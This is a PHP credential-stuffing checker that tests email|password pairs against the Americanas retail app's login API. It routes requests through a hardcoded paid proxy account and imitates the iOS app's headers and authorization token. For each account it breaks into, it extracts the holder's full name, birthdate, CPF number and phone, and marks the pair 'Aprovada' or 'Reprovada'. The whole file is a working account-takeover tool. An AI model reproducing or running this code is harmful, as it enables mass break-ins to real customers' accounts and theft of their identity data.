
<?php
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Sao_Paulo');
 
 
function getStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}
 
function getStr2($dado, $string, $string2){ // FUNCTION QUE PUXA UM VALOR INDEFINIDO ENTRE DUAS STRINGS QUE NรO MUDAM.
  preg_match_all("($string(.*)$string2)siU", $dado, $match1);
  return $match1[1][0];
 
}
extract($_GET);
$lista = str_replace(" " , "", $lista);
$separar = explode("|", $lista);
$email  = $separar[0];
$senha = $separar[1];
 
 
$username = 'blue3419ankj16047'; 
$password = 'ku9VsvUjT7gv7oOx_country-Brazil'; 
$proxy = 'isp2.hydraproxy.com:9989';

/*
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://app.americanas.com.br/config-mobile/americanas/android/2016-07-18/appConfig.json');  
curl_setopt($ch, CURLOPT_PROXY, $proxy); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username:$password"); 	
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, arraY(
    'Host: app.americanas.com.br',
    'Connection: Keep-Alive',
    'Accept-Encoding: gzip',
    'User-Agent: okhttp/3.11.0',
	));
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
$data = curl_exec($ch);
//$clipping = getStr($data, '<input name="clipping" id="clipping" type="hidden" value="', '" />');
//echo $data;
*/



$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://customer-token-v1-americanas.b2w.io/customer-token'); 
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username:$password"); 
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookie.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, arraY(
'Host: customer-token-v1-americanas.b2w.io',
'Content-Type: application/vnd.login.b2w+json',
'Accept: */*',
'Accept-Encoding: gzip, deflate',
'Connection: close',
'X-NewRelic-ID: UgEAU1NQGwEFVllRBQIA',
'User-Agent: Americanas/4.137 (iPhone; iOS 12.5.4; Scale/2.00)',
'Accept-Language: pt-BR;q=1',
'Authorization: Basic YXBwaW9zYWNvbTpXTnZiVG8=',
	));
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"login":"'.$email.'","password":"'.$senha.'"}');
$d1 = curl_exec($ch);
$customer = getStr($d1, '"id":"', '"');
$token = getStr($d1, '"token":"', '"');

if(stristr($d1,'AUTHENTICATED') !== false){
	
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://sacola.americanas.com.br/api/v6/customer/'.$customer.'?persist=true');  
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username:$password"); 
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookie.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, arraY(
'Host: sacola.americanas.com.br',
'Accept: */*',
'Connection: close',
'access-token: '.$token.'',
'X-NewRelic-ID: UgEAU1NQGwEFVllRBQIA',
'User-Agent: Americanas/4.137 (iPhone; iOS 12.5.4; Scale/2.00)',
'Accept-Language: pt-BR;q=1',
'Authorization: Basic YXBwaW9zYWNvbTpXTnZiVG8=',
'Accept-Encoding: gzip, deflate',
	));
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
$d2 = curl_exec($ch);



$fullName = getStr($d2, '"fullName":"', '"');
$birthday = getStr($d2, '"birthday":"', '",');
$cpf = getStr($d2, '"cpf":"', '",');
$ddd = getStr($d2, '"cellphone":{"ddd":"', '",');
$number = getStr($d2, '"cellphone":{"ddd":"'.$ddd.'","number":"', '"');
$status = getStr($d2, '"status":"', '",');

}



     if(stristr($d1,'AUTHENTICATED') !== false){
        echo '  
<div class="alert alert-fixed alert-success alert-dismissible" role="alert">
                                  <button type="button" class="close" data-dismiss="alert"><span aria-hidden="true"><i class="pe-7s-close"></i></span><span class="sr-only"></span></button>
                                  <div class="alert__icon pull-left" >
                                    <i class="pe-7s-check"></i>
                                  </div>
                                  <div class="text-center">
                                  <p class="alert__text"><strong>#Aprovada </strong> '.$email.'|'.$senha.' → Nome: '.$fullName.' | Data: '.$birthday.' | CPF: '.$cpf.' | Telefone: '.$ddd.''.$number.' | Status: '.$status.' <strong></strong></p>
                                  </div>
 
                         
  </div>
                                </div>
                                 
';
	 }
	
else{
        echo '               
<div class="alert alert-fixed alert-danger alert-dismissible" role="alert">
                                  <button type="button" class="close" data-dismiss="alert"><span aria-hidden="true"><i class="pe-7s-close"></i></span><span class="sr-only"></span></button>
                                  <div class="alert__icon pull-left" >
                                    <i class="pe-7s-close-circle"></i>
                                  </div>
                                  <div class="text-center">
                                  <p class="alert__text"><strong>#Reprovada </strong> '.$email.'|'.$senha.' Return → '.$d1.' <strong> </strong></p>
                                  </div>
 
                         
  </div>
                                </div>
';

}

curl_close($ch);
 ob_flush();        
                             
?>
